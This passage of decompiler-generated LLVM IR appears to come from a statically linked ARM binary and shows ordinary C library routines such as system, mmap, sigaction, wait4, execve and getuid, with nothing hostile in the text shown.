  store i32 120, i32* %r3.global-to-local, align 4
  %v0_1767c = load i32, i32* @r6, align 4
  %v2_1767c = add i32 %v0_1767c, 120
  %v3_1767c = inttoptr i32 %v2_1767c to i32*
  %v4_1767c = load i32, i32* %v3_1767c, align 4
  store i32 %v4_1767c, i32* %r3.global-to-local, align 4
  %v2_17680 = inttoptr i32 %v4_1767c to i32*
  store i32 %v2_1766c, i32* %v2_17680, align 4
  %v0_17688 = load i32, i32* @r7, align 4
  %v1_17688 = inttoptr i32 %v0_17688 to i32*
  %v2_17688 = load i32, i32* %v1_17688, align 4
  %v4_1768c = call i32 @__GI_strrchr(i32 %v2_17688, i32 47, i32 %v2_17660, i32 %v4_1767c)
  store i32 %v4_1768c, i32* @r0, align 4
  store i32 68, i32* %r3.global-to-local, align 4
  %v2_17694 = icmp eq i32 %v4_1768c, 0
  store i1 %v2_17694, i1* %cpsr_z.global-to-local, align 1
  %v0_17698 = load i32, i32* @r6, align 4
  %v2_17698 = add i32 %v0_17698, 68
  %v3_17698 = inttoptr i32 %v2_17698 to i32*
  %v4_17698 = load i32, i32* %v3_17698, align 4
  store i32 %v4_17698, i32* %r2.global-to-local, align 4
  br i1 %v2_17694, label %.thread47, label %bb64

.thread47:                                        ; preds = %dec_label_pc_17678
  %v2_176a048 = inttoptr i32 %v4_17698 to i32*
  store i32 0, i32* %v2_176a048, align 4
  br label %bb65

bb64:                                             ; preds = %dec_label_pc_17678
  %v2_1769c = add i32 %v4_1768c, 1
  store i32 %v2_1769c, i32* %r3.global-to-local, align 4
  %v2_176a0 = inttoptr i32 %v4_17698 to i32*
  store i32 %v4_1768c, i32* %v2_176a0, align 4
  %v1_176a4 = load i32, i32* %r3.global-to-local, align 4
  %v2_176a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_176a4 = inttoptr i32 %v2_176a4 to i32*
  store i32 %v1_176a4, i32* %v3_176a4, align 4
  br label %bb65

bb65:                                             ; preds = %.thread47, %bb64, %dec_label_pc_17660
  store i32 0, i32* %r5.global-to-local, align 4
  %v0_176bc = load i32, i32* @r6, align 4
  %v2_176bc = add i32 %v0_176bc, -12
  store i32 %v2_176bc, i32* %r8.global-to-local, align 4
  store i32 26504, i32* %r3.global-to-local, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v3_176cc = add i32 %v0_176bc, 26504
  %v4_176cc = inttoptr i32 %v3_176cc to i32*
  store i32 %arg5, i32* %v4_176cc, align 4
  %v0_176e417 = load i32, i32* %r4.global-to-local, align 4
  %v1_176e418 = load i32, i32* %r5.global-to-local, align 4
  %v3_176e420 = icmp ult i32 %v0_176e417, %v1_176e418
  %v9_176e426 = icmp eq i32 %v0_176e417, %v1_176e418
  store i1 %v9_176e426, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_176e420, label %dec_label_pc_176d4, label %dec_label_pc_17714.lr.ph

dec_label_pc_176d4:                               ; preds = %dec_label_pc_176d4, %bb65
  %v1_176d4 = phi i32 [ %v1_176e0, %dec_label_pc_176d4 ], [ %v0_176e417, %bb65 ]
  %v0_176d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_176d4 = mul i32 %v1_176d4, 4
  %v5_176d4 = add i32 %v4_176d4, %v0_176d4
  %v6_176d4 = inttoptr i32 %v5_176d4 to i32*
  %v7_176d4 = load i32, i32* %v6_176d4, align 4
  store i32 %v7_176d4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_176d4)
  %v0_176e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_176e0 = add i32 %v0_176e0, 1
  store i32 %v1_176e0, i32* %r4.global-to-local, align 4
  %v1_176e4 = load i32, i32* %r5.global-to-local, align 4
  %v3_176e4 = icmp ult i32 %v1_176e0, %v1_176e4
  %v9_176e4 = icmp eq i32 %v1_176e0, %v1_176e4
  store i1 %v9_176e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_176e4, label %dec_label_pc_176d4, label %dec_label_pc_17714.lr.ph

dec_label_pc_17714.lr.ph:                         ; preds = %dec_label_pc_176d4, %bb65
  %v2_176ec = icmp eq i32 %v0_17548, 0
  store i1 %v2_176ec, i1* %cpsr_z.global-to-local, align 1
  %v2_176f4 = xor i1 %v2_176ec, true
  call void @__pseudo_cond_branch(i1 %v2_176f4, i32 %v0_17548)
  store i32 -12, i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r5.global-to-local, align 4
  %v0_17708 = load i32, i32* @r6, align 4
  %v2_17708 = add i32 %v0_17708, -12
  store i32 %v2_17708, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17714

dec_label_pc_17714:                               ; preds = %dec_label_pc_17714.dec_label_pc_17714_crit_edge, %dec_label_pc_17714.lr.ph
  %v1_17714 = phi i32 [ %v1_17720, %dec_label_pc_17714.dec_label_pc_17714_crit_edge ], [ 0, %dec_label_pc_17714.lr.ph ]
  %v0_17714 = phi i32 [ %v0_17714.pre, %dec_label_pc_17714.dec_label_pc_17714_crit_edge ], [ %v2_17708, %dec_label_pc_17714.lr.ph ]
  %v4_17714 = mul i32 %v1_17714, 4
  %v5_17714 = add i32 %v4_17714, %v0_17714
  %v6_17714 = inttoptr i32 %v5_17714 to i32*
  %v7_17714 = load i32, i32* %v6_17714, align 4
  store i32 %v7_17714, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v7_17714)
  %v0_17720 = load i32, i32* %r4.global-to-local, align 4
  %v1_17720 = add i32 %v0_17720, 1
  store i32 %v1_17720, i32* %r4.global-to-local, align 4
  %v1_17724 = load i32, i32* %r5.global-to-local, align 4
  %v3_17724 = icmp ult i32 %v1_17720, %v1_17724
  %v9_17724 = icmp eq i32 %v1_17720, %v1_17724
  store i1 %v9_17724, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17724, label %dec_label_pc_17714.dec_label_pc_17714_crit_edge, label %dec_label_pc_1772c

dec_label_pc_17714.dec_label_pc_17714_crit_edge:  ; preds = %dec_label_pc_17714
  %v0_17714.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_17714

dec_label_pc_1772c:                               ; preds = %dec_label_pc_17714
  %v0_17730.pre = load i32, i32* @r6, align 4
  store i32 112, i32* %r3.global-to-local, align 4
  %v2_17730 = add i32 %v0_17730.pre, 112
  %v3_17730 = inttoptr i32 %v2_17730 to i32*
  %v4_17730 = load i32, i32* %v3_17730, align 4
  store i32 %v4_17730, i32* %r2.global-to-local, align 4
  store i32 %v4_17730, i32* %r3.global-to-local, align 4
  %v2_17738 = icmp eq i32 %v4_17730, 0
  store i1 %v2_17738, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17738, label %dec_label_pc_17750, label %dec_label_pc_17740

dec_label_pc_17740:                               ; preds = %dec_label_pc_1772c
  call void @__pseudo_branch(i32 %v4_17730)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1774c = load i32, i32* @r0, align 4
  %v2_1774c = inttoptr i32 %v1_1774c to i32*
  store i32 0, i32* %v2_1774c, align 4
  %v0_17754.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17750

dec_label_pc_17750:                               ; preds = %dec_label_pc_1772c, %dec_label_pc_17740
  %v0_17754 = phi i32 [ %v0_17730.pre, %dec_label_pc_1772c ], [ %v0_17754.pre, %dec_label_pc_17740 ]
  store i32 88, i32* %r3.global-to-local, align 4
  %v2_17754 = add i32 %v0_17754, 88
  %v3_17754 = inttoptr i32 %v2_17754 to i32*
  %v4_17754 = load i32, i32* %v3_17754, align 4
  store i32 %v4_17754, i32* %r2.global-to-local, align 4
  store i32 %v4_17754, i32* %r3.global-to-local, align 4
  %v2_1775c = icmp eq i32 %v4_17754, 0
  store i1 %v2_1775c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1775c, label %dec_label_pc_17774, label %dec_label_pc_17764

dec_label_pc_17764:                               ; preds = %dec_label_pc_17750
  call void @__pseudo_branch(i32 %v4_17754)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_17770 = load i32, i32* @r0, align 4
  %v2_17770 = inttoptr i32 %v1_17770 to i32*
  store i32 0, i32* %v2_17770, align 4
  %v0_17778.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %dec_label_pc_17750, %dec_label_pc_17764
  %v0_17778 = phi i32 [ %v0_17754, %dec_label_pc_17750 ], [ %v0_17778.pre, %dec_label_pc_17764 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v2_17778 = add i32 %v0_17778, 32
  %v3_17778 = inttoptr i32 %v2_17778 to i32*
  %v4_17778 = load i32, i32* %v3_17778, align 4
  store i32 %v4_17778, i32* %r3.global-to-local, align 4
  %v1_17780 = inttoptr i32 %v4_17778 to i32*
  %v2_17780 = load i32, i32* %v1_17780, align 4
  store i32 %v2_17780, i32* %r2.global-to-local, align 4
  %v0_17784 = load i32, i32* %sb.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v1_17790 = call i32 @__GI_exit(i32 %v0_17784)
  %v0_17794 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17794, label %bb66, label %.thread8

bb66:                                             ; preds = %dec_label_pc_17774
  %v3_17794 = load i32, i32* @r1, align 4
  %v4_17794 = inttoptr i32 %v3_17794 to i32*
  store i32 %v1_17790, i32* %v4_17794, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_17774, %bb66
  %v4_177b4 = phi i32 [ %v1_17790, %dec_label_pc_17774 ], [ 0, %bb66 ]
  ret i32 %v4_177b4

; uselistorder directives
  uselistorder i32 %v0_17730.pre, { 1, 0 }
  uselistorder i32 %v1_17724, { 1, 0 }
  uselistorder i32 %v1_17720, { 3, 2, 1, 0 }
  uselistorder i32 %v1_176e4, { 1, 0 }
  uselistorder i32 %v1_176e0, { 1, 2, 3, 0 }
  uselistorder i32 %v4_17698, { 1, 0, 2 }
  uselistorder i1 %v8_175e0, { 1, 2, 0 }
  uselistorder i32 %v2_175b0, { 1, 2, 0 }
  uselistorder i1 %v2_17598, { 1, 0 }
  uselistorder i32 %v4_1757c, { 1, 0, 3, 2 }
  uselistorder i32 %storemerge, { 2, 1, 0 }
  uselistorder i32 %v0_17548, { 1, 0 }
  uselistorder i32 %v3_17518, { 1, 0 }
  uselistorder i32 %tmp53, { 1, 4, 0, 2, 3 }
  uselistorder i32 %tmp52, { 1, 0 }
  uselistorder i32 %tmp51, { 1, 0 }
  uselistorder i32 %tmp50, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %r5.global-to-local, { 3, 4, 1, 0, 2, 5, 6 }
  uselistorder i32* %r4.global-to-local, { 6, 5, 0, 1, 3, 2, 4, 8, 7, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 18, 11, 12, 13, 14, 15, 16, 17, 19, 20, 2, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 8, 4, 5, 6, 7, 10, 11, 9, 12, 13, 14, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i1* %cpsr_z.global-to-local, { 3, 4, 5, 9, 0, 10, 6, 1, 7, 8, 11, 12, 13, 14, 15, 16, 17, 19, 18, 2, 20 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 5, 4, 2, 3, 1 }
  uselistorder i32 47, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 120, { 1, 2, 0, 4, 3 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_17774, { 1, 0 }
  uselistorder label %dec_label_pc_17750, { 1, 0 }
  uselistorder label %bb65, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17660, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1763c, { 3, 0, 1, 2 }
  uselistorder label %bb63, { 1, 0 }
  uselistorder label %dec_label_pc_175b0, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_17598, { 1, 0 }
}

define i32 @__libc_system(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_177d4 = load i32, i32* @r4, align 4
  %v0_177e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_177e0 = icmp eq i32 %v0_177e0, 0
  br i1 %v2_177e0, label %bb, label %dec_label_pc_177f8

bb:                                               ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17914

dec_label_pc_177f8:                               ; preds = %entry
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_17800 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17810 = call i32 @bsd_signal(i32 2, i32 1)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17820 = call i32 @bsd_signal(i32 17, i32 0)
  store i32 %v2_17820, i32* @r0, align 4
  %v0_17828 = call i32 @__vfork()
  store i32 %v0_17828, i32* %r0.global-to-local, align 4
  store i32 %v0_17828, i32* @r4, align 4
  %v1_1782c = icmp slt i32 %v0_17828, 0
  br i1 %v1_1782c, label %dec_label_pc_17834, label %dec_label_pc_17860

dec_label_pc_17834:                               ; preds = %dec_label_pc_177f8
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1783c = call i32 @bsd_signal(i32 3, i32 %v2_17800)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17848 = call i32 @bsd_signal(i32 2, i32 %v2_17810)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17854 = call i32 @bsd_signal(i32 17, i32 %v2_17820)
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17914

dec_label_pc_17860:                               ; preds = %dec_label_pc_177f8
  %v2_1782c = icmp eq i32 %v0_17828, 0
  br i1 %v2_1782c, label %dec_label_pc_17864, label %dec_label_pc_178b8

dec_label_pc_17864:                               ; preds = %dec_label_pc_17860
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_1786c = call i32 @bsd_signal(i32 3, i32 0)
  %v0_17870 = load i32, i32* @r4, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17878 = call i32 @bsd_signal(i32 2, i32 %v0_17870)
  %v0_1787c = load i32, i32* @r4, align 4
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_17884 = call i32 @bsd_signal(i32 17, i32 %v0_1787c)
  store i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2232), i32* %r0.global-to-local, align 4
  %v0_178a8 = load i32, i32* @r4, align 4
  %v5_178ac = call i32 @execl(i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2232), i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2224), i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2220), i32 %v0_177e0, i32 %v0_178a8)
  store i32 127, i32* %r0.global-to-local, align 4
  %v1_178b4 = call i32 @__GI__exit(i32 127)
  store i32 %v1_178b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_178b8

dec_label_pc_178b8:                               ; preds = %dec_label_pc_17860, %dec_label_pc_17864
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_178c0 = call i32 @bsd_signal(i32 3, i32 1)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_178cc = call i32 @bsd_signal(i32 2, i32 1)
  %v2_178d8 = ptrtoint i32* %stack_var_-12 to i32
  %v0_178dc = load i32, i32* @r4, align 4
  store i32 %v0_178dc, i32* %r0.global-to-local, align 4
  %v2_178e0 = call i32 @wait4(i32 %v0_178dc, i32 %v2_178d8)
  store i32 %v2_178e0, i32* %r0.global-to-local, align 4
  %v7_178e4 = icmp eq i32 %v2_178e0, -1
  br i1 %v7_178e4, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_178b8
  store i32 %v2_178e0, i32* %stack_var_-12, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_178b8, %bb11
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_178f4 = call i32 @bsd_signal(i32 3, i32 %v2_17800)
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_17900 = call i32 @bsd_signal(i32 2, i32 %v2_17810)
  store i32 17, i32* %r0.global-to-local, align 4
  %v2_1790c = call i32 @bsd_signal(i32 17, i32 %v2_17820)
  %v3_17910 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_17910, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17914

dec_label_pc_17914:                               ; preds = %bb, %dec_label_pc_17834, %bb12
  %v1_1791c = phi i32 [ 1, %bb ], [ -1, %dec_label_pc_17834 ], [ %v3_17910, %bb12 ]
  store i32 %v3_177d4, i32* @r4, align 4
  ret i32 %v1_1791c

; uselistorder directives
  uselistorder i32 %v2_178e0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 7, 6, 8, 9, 10, 12, 11, 13, 14, 15, 17, 16, 18, 19, 20, 21, 22, 23, 24, 0, 1 }
  uselistorder i32 (i32, i32)* @wait4, { 1, 0 }
  uselistorder i32 (i32)* @__GI__exit, { 8, 0, 17, 16, 15, 14, 13, 12, 11, 10, 6, 5, 4, 3, 2, 9, 7, 1 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @execl, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_28010.981 to i32), i32 -2232), { 1, 0 }
  uselistorder i32 ()* @__vfork, { 1, 0 }
  uselistorder i32 (i32, i32)* @bsd_signal, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 14 }
  uselistorder label %dec_label_pc_17914, { 2, 1, 0 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %dec_label_pc_178b8, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17930 = load i32, i32* @r4, align 4
  store i32 %v3_17930, i32* %stack_var_-16, align 4
  %v3_1793c = urem i32 %arg3, 4096
  %v2_17940 = icmp eq i32 %v3_1793c, 0
  br i1 %v2_17940, label %dec_label_pc_1795c, label %dec_label_pc_17948

dec_label_pc_17948:                               ; preds = %entry
  %v0_17948 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17954 = inttoptr i32 %v0_17948 to i32*
  store i32 22, i32* %v2_17954, align 4
  %v0_1798c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1798c

dec_label_pc_1795c:                               ; preds = %entry
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17988, label %dec_label_pc_17978

dec_label_pc_17978:                               ; preds = %dec_label_pc_1795c
  %v0_17978 = call i32 @__GI___errno_location()
  %v0_1797c = load i32, i32* %r4.global-to-local, align 4
  %v1_1797c = sub i32 0, %v0_1797c
  %v2_17980 = inttoptr i32 %v0_17978 to i32*
  store i32 %v1_1797c, i32* %v2_17980, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_1795c, %dec_label_pc_17978
  %v0_17988 = phi i32 [ %arg1, %dec_label_pc_1795c ], [ -1, %dec_label_pc_17978 ]
  store i32 %v0_17988, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1798c

dec_label_pc_1798c:                               ; preds = %dec_label_pc_17948, %dec_label_pc_17988
  %v0_1798c = phi i32 [ %v0_1798c.pre, %dec_label_pc_17948 ], [ %v0_17988, %dec_label_pc_17988 ]
  %v2_17990 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17990, i32* @r4, align 4
  ret i32 %v0_1798c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1798c, { 1, 0 }
  uselistorder label %dec_label_pc_17988, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v3_17998 = load i32, i32* @r4, align 4
  store i32 %v3_17998, i32* %stack_var_-8, align 4
  %v0_1799c = load i32, i32* @r0, align 4
  %v0_179a0 = call i32 @__GI___errno_location()
  %v1_179a4 = sub i32 0, %v0_1799c
  %v2_179a8 = inttoptr i32 %v0_179a0 to i32*
  store i32 %v1_179a4, i32* %v2_179a8, align 4
  %v2_179b0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_179b0, i32* @r4, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_179b8 = load i32, i32* @r4, align 4
  %v6_179b8 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_179c0 = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_28010.981 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_179c0, label %dec_label_pc_17a14, label %dec_label_pc_179d8

dec_label_pc_179d8:                               ; preds = %entry
  %v1_179d8 = add i32 %arg2, 4
  %v2_179d8 = inttoptr i32 %v1_179d8 to i32*
  %v3_179d8 = load i32, i32* %v2_179d8, align 4
  store i32 %v3_179d8, i32* @r3, align 4
  %v1_179dc = and i32 %v3_179d8, 67108864
  %v2_179dc = icmp eq i32 %v1_179dc, 0
  br i1 %v2_179dc, label %dec_label_pc_179e4, label %dec_label_pc_17a14

dec_label_pc_179e4:                               ; preds = %dec_label_pc_179d8
  store i32 20, i32* @r2, align 4
  %v2_179e8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_179e8, i32* @r0, align 4
  %v0_179ec = call i32 @memcpy()
  store i32 %v2_179e8, i32* @ip, align 4
  %v0_17a14.pre = load i32, i32* @r5, align 4
  %v0_17a1c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17a14

dec_label_pc_17a14:                               ; preds = %dec_label_pc_179d8, %entry, %dec_label_pc_179e4
  %v0_17a1c = phi i32 [ %arg3, %dec_label_pc_179d8 ], [ %arg3, %entry ], [ %v0_17a1c.pre, %dec_label_pc_179e4 ]
  %v0_17a18 = phi i32 [ %arg2, %dec_label_pc_179d8 ], [ 0, %entry ], [ %v2_179e8, %dec_label_pc_179e4 ]
  %v0_17a14 = phi i32 [ %arg1, %dec_label_pc_179d8 ], [ %arg1, %entry ], [ %v0_17a14.pre, %dec_label_pc_179e4 ]
  %v4_17a24 = call i32 @__syscall_rt_sigaction(i32 %v0_17a14, i32 %v0_17a18, i32 %v0_17a1c, i32 8)
  store i32 %v3_179b8, i32* @r4, align 4
  store i32 %v6_179b8, i32* @r5, align 4
  ret i32 %v4_17a24

; uselistorder directives
  uselistorder label %dec_label_pc_17a14, { 2, 0, 1 }
}

define i32 @function_17a38(i32 %arg1) local_unnamed_addr {
dec_label_pc_17a38:
  %v0_17a38 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17a38, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17a38
  %v2_17a38 = load i32, i32* @ip, align 4
  %v8_17a38 = ashr i32 %v2_17a38, %arg1
  %v9_17a38 = and i32 %v8_17a38, %arg1
  %v2_17a3c = load i32, i32* @r4, align 4
  %v8_17a3c = ashr i32 %v2_17a3c, %v9_17a38
  %v9_17a3c = and i32 %v8_17a3c, %v9_17a38
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17a38, %bb
  %v0_17a40 = phi i32 [ %arg1, %dec_label_pc_17a38 ], [ %v9_17a3c, %bb ]
  ret i32 %v0_17a40

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer() local_unnamed_addr {
entry:
  %v0_17a54 = load i32, i32* @r0, align 4
  ret i32 %v0_17a54
}

define i32 @wait4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17a58 = load i32, i32* @r7, align 4
  store i32 %v3_17a58, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17a80, label %dec_label_pc_17a70

dec_label_pc_17a70:                               ; preds = %entry
  %v0_17a70 = call i32 @__GI___errno_location()
  %v0_17a74 = load i32, i32* %r7.global-to-local, align 4
  %v1_17a74 = sub i32 0, %v0_17a74
  %v2_17a78 = inttoptr i32 %v0_17a70 to i32*
  store i32 %v1_17a74, i32* %v2_17a78, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17a84.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17a80

dec_label_pc_17a80:                               ; preds = %entry, %dec_label_pc_17a70
  %v2_17a84 = phi i32 [ %v3_17a58, %entry ], [ %v2_17a84.pre, %dec_label_pc_17a70 ]
  %v0_17a80 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_17a70 ]
  store i32 %v2_17a84, i32* @r7, align 4
  ret i32 %v0_17a80

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17a80, { 1, 0 }
}

define i32 @__GI_execve() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17a8c = load i32, i32* @r7, align 4
  store i32 %v3_17a8c, i32* %stack_var_-8, align 4
  %v0_17a98 = load i32, i32* @r0, align 4
  store i32 %v0_17a98, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17a98, -4095
  br i1 %tmp, label %dec_label_pc_17ab8, label %dec_label_pc_17aa8

dec_label_pc_17aa8:                               ; preds = %entry
  %v0_17aa8 = call i32 @__GI___errno_location()
  %v0_17aac = load i32, i32* %r7.global-to-local, align 4
  %v1_17aac = sub i32 0, %v0_17aac
  %v2_17ab0 = inttoptr i32 %v0_17aa8 to i32*
  store i32 %v1_17aac, i32* %v2_17ab0, align 4
  %v2_17ab8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17ab8

dec_label_pc_17ab8:                               ; preds = %entry, %dec_label_pc_17aa8
  %v1_17abc = phi i32 [ %v0_17a98, %entry ], [ -1, %dec_label_pc_17aa8 ]
  %v2_17ab8 = phi i32 [ %v3_17a8c, %entry ], [ %v2_17ab8.pre, %dec_label_pc_17aa8 ]
  store i32 %v2_17ab8, i32* %r7.global-to-local, align 4
  ret i32 %v1_17abc

; uselistorder directives
  uselistorder i32 %v0_17a98, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17ab8, { 1, 0 }
}

define i32 @getuid() local_unnamed_addr {
entry:
  %v1_17ad0 = load i32, i32* @r0, align 4
  ret i32 %v1_17ad0
}

define i32 @__GI_clock_getres(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17ad4 = load i32, i32* @r7, align 4
  store i32 %v3_17ad4, i32* %stack_var_-8, align 4
  %v0_17ae0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17ae0, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_17ae0, -4095
  br i1 %tmp, label %dec_label_pc_17b00, label %dec_label_pc_17af0

dec_label_pc_17af0:                               ; preds = %entry
  %v0_17af0 = call i32 @__GI___errno_location()
  %v0_17af4 = load i32, i32* %r7.global-to-local, align 4
  %v1_17af4 = sub i32 0, %v0_17af4
  %v2_17af8 = inttoptr i32 %v0_17af0 to i32*
  store i32 %v1_17af4, i32* %v2_17af8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_17b00.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17b00

dec_label_pc_17b00:                               ; preds = %entry, %dec_label_pc_17af0
  %v1_17b04 = phi i32 [ %v0_17ae0, %entry ], [ -1, %dec_label_pc_17af0 ]
  %v2_17b00 = phi i32 [ %v3_17ad4, %entry ], [ %v2_17b00.pre, %dec_label_pc_17af0 ]
  store i32 %v2_17b00, i32* %r7.global-to-local, align 4
  ret i32 %v1_17b04

; uselistorder directives
  uselistorder i32 %v0_17ae0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b00, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
